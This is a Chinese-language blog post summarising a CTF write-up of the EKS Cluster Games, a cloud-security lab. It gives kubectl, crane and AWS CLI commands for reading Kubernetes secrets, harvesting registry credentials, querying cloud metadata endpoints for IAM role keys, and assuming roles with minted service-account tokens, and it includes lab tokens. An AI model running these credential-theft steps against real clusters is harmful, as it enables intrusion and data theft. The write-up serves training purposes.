<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>EKS Cluster Games - Summary | Starven's Blog</title><meta name="author" content="Starven"><meta name="copyright" content="Starven"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="容器信息收集中kubectl常用命令总结总结：常用的信息收集命令(因为这关就是对secrets有list和get的权限) 1234567kubectl auth can-i --list kubectl get secrets kubectl get secrets secret-name -o json | jqkubectl get podskubectl get pod pod-name -">
<meta property="og:type" content="article">
<meta property="og:title" content="EKS Cluster Games - Summary">
<meta property="og:url" content="https://starven-l.github.io/2025/07/10/EKS-Cluster-Games-Summary/index.html">
<meta property="og:site_name" content="Starven&#39;s Blog">
<meta property="og:description" content="容器信息收集中kubectl常用命令总结总结：常用的信息收集命令(因为这关就是对secrets有list和get的权限) 1234567kubectl auth can-i --list kubectl get secrets kubectl get secrets secret-name -o json | jqkubectl get podskubectl get pod pod-name -">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/avatar.jpg?imageSlim">
<meta property="article:published_time" content="2025-07-10T03:37:11.000Z">
<meta property="article:modified_time" content="2025-07-10T03:37:54.513Z">
<meta property="article:author" content="Starven">
<meta property="article:tag" content="云安全">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/avatar.jpg?imageSlim"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "EKS Cluster Games - Summary",
  "url": "https://starven-l.github.io/2025/07/10/EKS-Cluster-Games-Summary/",
  "image": "https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/avatar.jpg?imageSlim",
  "datePublished": "2025-07-10T03:37:11.000Z",
  "dateModified": "2025-07-10T03:37:54.513Z",
  "author": [
    {
      "@type": "Person",
      "name": "Starven",
      "url": "https://starven-l.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://starven-l.github.io/2025/07/10/EKS-Cluster-Games-Summary/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'EKS Cluster Games - Summary',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/avatar.jpg?imageSlim" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/search/"><i class="fa-fw fas fa-search"></i><span> 搜索</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-archive"></i><span> 文档</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/avatar.jpg?imageSlim" alt="Logo"><span class="site-name">Starven's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">EKS Cluster Games - Summary</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/search/"><i class="fa-fw fas fa-search"></i><span> 搜索</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-archive"></i><span> 文档</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">EKS Cluster Games - Summary</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-07-10T03:37:11.000Z" title="发表于 2025-07-10 11:37:11">2025-07-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-07-10T03:37:54.513Z" title="更新于 2025-07-10 11:37:54">2025-07-10</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="容器信息收集中kubectl常用命令总结"><a href="#容器信息收集中kubectl常用命令总结" class="headerlink" title="容器信息收集中kubectl常用命令总结"></a>容器信息收集中kubectl常用命令总结</h1><p>总结：常用的信息收集命令(因为这关就是对secrets有list和get的权限)</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kubectl auth can-i --list </span><br><span class="line">kubectl get secrets </span><br><span class="line">kubectl get secrets secret-name -o json | jq</span><br><span class="line"></span><br><span class="line">kubectl get pods</span><br><span class="line">kubectl get pod pod-name -o jsonpath=<span class="string">&#x27;&#123;.spec.containers[*].name&#125;&#x27;</span></span><br><span class="line">kubectl exex -it pod-name -c my-container -- <span class="regexp">/bin/</span>bash</span><br></pre></td></tr></table></figure>

<h1 id="Attack-Docker或ECR等私有镜像仓库"><a href="#Attack-Docker或ECR等私有镜像仓库" class="headerlink" title="Attack Docker或ECR等私有镜像仓库"></a>Attack Docker或ECR等私有镜像仓库</h1><p>情景：已经有pod的shell和secret的get权限，pod的get和list权限，但是没有进入某个具体容器的权限</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kubectl get pod pod-name 之后如果有imagePullSecrets</span><br><span class="line"></span><br><span class="line">--&gt;获取到secrets仓库名</span><br><span class="line"></span><br><span class="line">--&gt;kubectl get secret registry-pull-secrets-780bab1d -o yaml</span><br><span class="line"></span><br><span class="line">--&gt;就会获取到<span class="attr">username</span>:password</span><br><span class="line"></span><br><span class="line">--&gt;crane auth login index.<span class="property">docker</span>.<span class="property">io</span> -u eksclustergames -p dckr_pat_YtncV-R85mG7m4lr45iYQj8FuCo</span><br><span class="line"></span><br><span class="line">--&gt;crane config index.<span class="property">docker</span>.<span class="property">io</span>/eksclustergames/&lt;镜像名&gt;:&lt;标签&gt;</span><br></pre></td></tr></table></figure>

<p>进阶：ECR镜像仓库（没有了secrets的get权限，只有pod的get和list权限）</p>
<p>通过元数据metadata信息收集！</p>
<hr>
<p>常见的公有云厂商的元数据地址：</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#<span class="variable constant_">AWS</span></span><br><span class="line">&lt;<span class="attr">http</span>:<span class="comment">//instance-data&gt;</span></span><br><span class="line"><span class="language-xml">&lt;http://169.254.169.254&gt;</span></span><br><span class="line">#<span class="title class_">Google</span> <span class="title class_">Cloud</span></span><br><span class="line">&lt;<span class="attr">http</span>:<span class="comment">//169.254.169.254&gt;</span></span><br><span class="line"><span class="language-xml">&lt;http://metadata.google.internal&gt;</span></span><br><span class="line"><span class="language-xml">&lt;http://metadata&gt;</span></span><br><span class="line">#<span class="title class_">Azure</span></span><br><span class="line">&lt;<span class="attr">http</span>:<span class="comment">//169.254.169.254&gt;</span></span><br><span class="line">#<span class="title class_">Digital</span> <span class="title class_">Ocean</span></span><br><span class="line">&lt;<span class="attr">http</span>:<span class="comment">//169.254.169.254&gt;</span></span><br><span class="line">#<span class="title class_">Packetcloud</span></span><br><span class="line">&lt;<span class="attr">https</span>:<span class="comment">//metadata.packet.net&gt;</span></span><br><span class="line">#<span class="title class_">Oracle</span> <span class="title class_">Cloud</span></span><br><span class="line">&lt;<span class="attr">http</span>:<span class="comment">//169.254.169.254&gt;</span></span><br><span class="line">#<span class="title class_">Alibaba</span> <span class="title class_">Cloud</span></span><br><span class="line">&lt;<span class="attr">http</span>:<span class="comment">//100.100.100.200&gt;</span></span><br><span class="line">#<span class="title class_">Tencent</span> <span class="title class_">Cloud</span></span><br><span class="line">&lt;<span class="attr">http</span>:<span class="comment">//metadata.tencentyun.com&gt;</span></span><br><span class="line"><span class="language-xml">&lt;http://169.254.0.23&gt;</span></span><br></pre></td></tr></table></figure>

<p>价值相对较高的元数据：</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mac    实例 <span class="variable constant_">MAC</span> 地址</span><br><span class="line">hostname    实例主机名</span><br><span class="line">iam/info    获取角色名称</span><br><span class="line">local-ipv4    实例本地 <span class="variable constant_">IP</span></span><br><span class="line">public-ipv4    实例公网 <span class="variable constant_">IP</span></span><br><span class="line">instance-id    实例 <span class="variable constant_">ID</span></span><br><span class="line">public-hostname    接口的公有 <span class="title function_">DNS</span> (<span class="title class_">IPv4</span>)</span><br><span class="line">placement/region    实例的 <span class="variable constant_">AWS</span> 区域</span><br><span class="line">public-keys/<span class="number">0</span>/openssh-key    公有密钥</span><br><span class="line">/iam/security-credentials/&lt;rolename&gt;    获取角色的临时凭证</span><br></pre></td></tr></table></figure>

<p>因此命令如下：</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">curl &lt;<span class="attr">http</span>:<span class="comment">//169.254.169.254/latest/metadata/iam/security-credentials/&gt; -w &#x27;\\n&#x27;</span></span><br><span class="line">curl &lt;<span class="attr">http</span>:<span class="comment">//169.254.169.254/latest/metadata/iam/security-credentials/&gt;&lt;rolename&gt; </span></span><br><span class="line">拿到ak sk session</span><br><span class="line"></span><br><span class="line">然后再通过aws ecr的cli来登录</span><br><span class="line">aws ecr get-login-password | crane auth login <span class="number">688655246681.</span>dkr.<span class="property">ecr</span>.<span class="property">us</span>-west-<span class="number">1.</span>amazonaws.<span class="property">com</span> -u <span class="variable constant_">AWS</span> --password-stdin</span><br><span class="line">crane config <span class="number">688655246681.</span>dkr.<span class="property">ecr</span>.<span class="property">us</span>-west-<span class="number">1.</span>amazonaws.<span class="property">com</span>/central_repo-aaf4a7c@<span class="attr">sha256</span>:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01 | jq</span><br></pre></td></tr></table></figure>

<h1 id="从AWS身份-—-Node层-模拟Node的IAM-—-k8s集群内部secrets"><a href="#从AWS身份-—-Node层-模拟Node的IAM-—-k8s集群内部secrets" class="headerlink" title="从AWS身份 —&gt; Node层(模拟Node的IAM) —&gt; k8s集群内部secrets"></a>从AWS身份 —&gt; Node层(模拟Node的IAM) —&gt; k8s集群内部secrets</h1><p>情景：有一个pod的权限受限的serviceAccount，然后aws的ak sk也都是配置好了的</p>
<p>攻击路径：aws ak sk—&gt; node IAM —&gt; k8s secrets</p>
<p>因此：</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">aws eks get-token --cluster-name eks-challenge-cluster</span><br><span class="line"></span><br><span class="line">kubectl get secrets --token k8s-aws-v1.&lt;token&gt;</span><br><span class="line"></span><br><span class="line">kubectl get secrets &lt;<span class="attr">secretName</span>:node-flag&gt; --token k8s-aws-v1.&lt;token&gt;</span><br></pre></td></tr></table></figure>

<h1 id="Trust-Policy的AssumeRoleWithWebIdentity和IAM-Policy"><a href="#Trust-Policy的AssumeRoleWithWebIdentity和IAM-Policy" class="headerlink" title="Trust Policy的AssumeRoleWithWebIdentity和IAM Policy"></a>Trust Policy的AssumeRoleWithWebIdentity和IAM Policy</h1><p>一句话总结：AssumeRoleWithWebIdentity是 AWS 的一种身份联合机制，允许外部身份（OIDC provider、Google、Facebook 等）通过 <strong>Web Identity Token</strong>，短暂“扮演”一个 IAM Role，获得临时权限</p>
<p>有sa的get和list权限</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;secrets&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;get&quot;</span>,</span><br><span class="line">        <span class="string">&quot;list&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;serviceaccounts&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;get&quot;</span>,</span><br><span class="line">        <span class="string">&quot;list&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;pods&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;get&quot;</span>,</span><br><span class="line">        <span class="string">&quot;list&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;serviceaccounts/token&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;create&quot;</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>攻击路径（ServiceAccount↔IAM Role   —&gt;  kubectl create token —&gt; Token(满足Trust Policy)   —&gt;  通过token利用AssumeRoleWithWebIdentity获取ak sk —&gt; s3存储桶flag）</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[<span class="variable constant_">EKS</span> <span class="title class_">Pod</span>（初始权限）]</span><br><span class="line">    |</span><br><span class="line">    |--&gt; 查看 <span class="title class_">ServiceAccount</span>（kubectl get sa）</span><br><span class="line">    |</span><br><span class="line">    |--&gt; 找到绑定了 <span class="variable constant_">IAM</span> <span class="title class_">Role</span> 的 <span class="title class_">ServiceAccount</span>（如：s3access-sa，但这里其实是debug-sa）</span><br><span class="line">    |</span><br><span class="line">    |--&gt; 利用权限创建 token（kubectl create token s3access-sa --audience sts.<span class="property">amazonaws</span>.<span class="property">com</span>）</span><br><span class="line">    |</span><br><span class="line">    |--&gt; 得到 <span class="variable constant_">OIDC</span> <span class="variable constant_">JWT</span> <span class="title class_">Token</span>（符合 <span class="title class_">Trust</span> <span class="title class_">Policy</span> 的条件）</span><br><span class="line">    |</span><br><span class="line">    |--&gt; 使用 token 执行 <span class="attr">sts</span>:<span class="title class_">AssumeRoleWithWebIdentity</span>（aws sts assume-role-<span class="keyword">with</span>-web-identity ...见下面）</span><br><span class="line">    |</span><br><span class="line">    |--&gt; 成功获取 <span class="variable constant_">AWS</span> 临时凭据（<span class="title class_">AccessKeyId</span> / <span class="title class_">SecretAccessKey</span> / <span class="title class_">SessionToken</span>）</span><br><span class="line">    |</span><br><span class="line">    |--&gt; 导入临时凭据为 <span class="variable constant_">AWS</span> <span class="variable constant_">CLI</span> 环境变量（<span class="keyword">export</span> ...）</span><br><span class="line">    |</span><br><span class="line">    |--&gt; 使用 <span class="variable constant_">AWS</span> <span class="variable constant_">CLI</span> 操作目标资源（aws s3 cp ...）</span><br><span class="line">    |</span><br><span class="line">    |--&gt; 成功从 <span class="variable constant_">S3</span> 读取 flag 文件</span><br></pre></td></tr></table></figure>

<p>Trust Policy可以限制token的jwt中的audience和Federated（对应aud和iss）</p>
<p>因此创建token的时候需要添加满足限制条件的要求</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create token debug-sa --audience  sts.<span class="property">amazonaws</span>.<span class="property">com</span></span><br></pre></td></tr></table></figure>

<p>获取到token下一步就是模拟 IAM 权限了来获取ak sk</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aws sts assume-role-<span class="keyword">with</span>-web-identity \\</span><br><span class="line">  --role-arn <span class="attr">arn</span>:<span class="attr">aws</span>:<span class="attr">iam</span>::<span class="number">688655246681</span>:role/challengeEksS3Role \\</span><br><span class="line">  --role-session-name sessionStarvenHacker \\</span><br><span class="line">  --web-identity-token eyJhbGciOiJSUzI1NiIsImtpZCI6ImI4YzE2MTEwNzZiMzY5ZjRmYTQ1YTYxODU3YmE3NGQ0ZjU4YWFkMGQifQ.<span class="property">eyJhdWQiOlsic3RzLmFtYXpvbmF3cy5jb20iXSwiZXhwIjoxNzUyMDU0ODk1LCJpYXQiOjE3NTIwNTEyOTUsImlzcyI6Imh0dHBzOi8vb2lkYy5la3MudXMtd2VzdC0xLmFtYXpvbmF3cy5jb20vaWQvQzA2MkMyMDdDOEY1MERFNEVDMjRBMzcyRkY2MEU1ODkiLCJrdWJlcm5ldGVzLmlvIjp7Im5hbWVzcGFjZSI6ImNoYWxsZW5nZTUiLCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVidWctc2EiLCJ1aWQiOiI2Y2I2MDI0YS1jNGRhLTQ3YTktOTA1MC01OWM4YzcwNzk5MDQifX0sIm5iZiI6MTc1MjA1MTI5NSwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmNoYWxsZW5nZTU6ZGVidWctc2EifQ</span>.<span class="property">MU1sRiWXmAxH0OTU73165Yn</span>-<span class="title class_">YNsjxY</span>1uTpL2tXvnbHMW4SLjYsbYuqmfia59KnmLlnaaqoL2aWBcsUxj4zuOX7Tw2Wp2Cp-dwHzY9-<span class="title class_">Xsgp1</span>dvo8sYLNScXUN8Q3IYHXfb7MhVPgk9cRknc3jEGCNGk3H43Lbn2wJv4KB0K4kmuCEMQc9gDcySwy6ia2p3GuQLmIQmrOOt1Hphkp1sIsb9HrraCnQ99g-<span class="number">7</span>-<span class="title class_">Hg9</span>kaf3cn64RYX6r-tUhW1ctr0ym1oM_St4EcafI6jFxsQf6hQbMx2cPiSEKti4bo-<span class="title class_">LW4</span>zexJMg_CgnxxXMieI4BVtGwlulq4yuA69ca86aLh_wT588Q</span><br></pre></td></tr></table></figure>

<p>然后就获取s3存储桶flag就行了</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://starven-l.github.io">Starven</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://starven-l.github.io/2025/07/10/EKS-Cluster-Games-Summary/">https://starven-l.github.io/2025/07/10/EKS-Cluster-Games-Summary/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://starven-l.github.io" target="_blank">Starven's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E4%BA%91%E5%AE%89%E5%85%A8/">云安全</a></div><div class="post-share"><div class="social-share" data-image="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/avatar.jpg?imageSlim" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/07/14/MCP%E5%A4%A7%E6%A8%A1%E5%9E%8B%E4%B8%8A%E4%B8%8B%E6%96%87%E5%8D%8F%E8%AE%AE/" title="MCP大模型上下文协议"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">MCP大模型上下文协议</div></div><div class="info-2"><div class="info-item-1">本文仅是对原文的阅读理解与自己处理后的cv浓缩 一、什么是Model Context Protocol1. 初识MCP及其价值2024年11月底，由 Anthropic 推出的一种开放标准，旨在统一大模型与外部数据源和工具之间的通信协议 MCP 的主要目的在于解决当前 AI 模型因数据孤岛限制而无法充分发挥潜力的难题，MCP 使得 AI 应用能够安全地访问和操作本地及远程数据 MCP的价值：显而易见，对比一下就很清晰了 123在过去，为了让大模型等 AI 应用使用数据，要么复制粘贴，要么上传知识库，非常局限现在 MCP 可以直接在 AI 与数据（包括本地数据和互联网数据）之间架起一座桥梁，通过 MCP 服务器和 MCP 客户端  因此有了MCP，可以和数据和文件系统、开发工具、Web 和浏览器自动化、生产力和通信、各种社区生态能力全部集成，实现强大的协作工作能力，它的价值远不可估量。 因此也就可以随之诞生AI Agent 2. MCP核心架构原文先讲的数据安全性和工作原理，但是我认为先学习MCP核心架构较为合适，因此这部分内容前置到这里了 MCP也是C&#x2F;S架构，有以下核...</div></div></div></a><a class="pagination-related" href="/2025/07/09/EKS-Cluster-Games-wp-By-Starven/" title="EKS Cluster Games wp - By.Starven"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">EKS Cluster Games wp - By.Starven</div></div><div class="info-2"><div class="info-item-1">Secret Seeker先贴一下打的过程中前期的shell命令吧，也体现一下我的容器中的信息收集思路 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115root@wiz-eks-challenge:~# kubectl get pods -AError from server (Forbidden): pods is forbidden: User &quot;system:serviceaccount:challenge1:service-account-challenge1&quot; cannot list resource &quot;pods&quot...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/07/09/EKS-Cluster-Games-wp-By-Starven/" title="EKS Cluster Games wp - By.Starven"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-09</div><div class="info-item-2">EKS Cluster Games wp - By.Starven</div></div><div class="info-2"><div class="info-item-1">Secret Seeker先贴一下打的过程中前期的shell命令吧，也体现一下我的容器中的信息收集思路 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115root@wiz-eks-challenge:~# kubectl get pods -AError from server (Forbidden): pods is forbidden: User &quot;system:serviceaccount:challenge1:service-account-challenge1&quot; cannot list resource &quot;pods&quot...</div></div></div></a><a class="pagination-related" href="/2025/07/08/k8s-LAN-Party-Summary-Thinking/" title="k8s LAN Party - Summary &amp; Thinking"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-08</div><div class="info-item-2">k8s LAN Party - Summary &amp; Thinking</div></div><div class="info-2"><div class="info-item-1">Reverse DNS Scanning技术这个技术就是第一关的考察点，对于level1如果单从拿到flag来说只需要对整个k8s集群的服务 进行一个reverse dns scanning即可扫描探测服务 flag就在其中一个服务里面curl即可得到 但是深究其背后原因，其实就得深入到k8s service特性ip反解域名原理研究 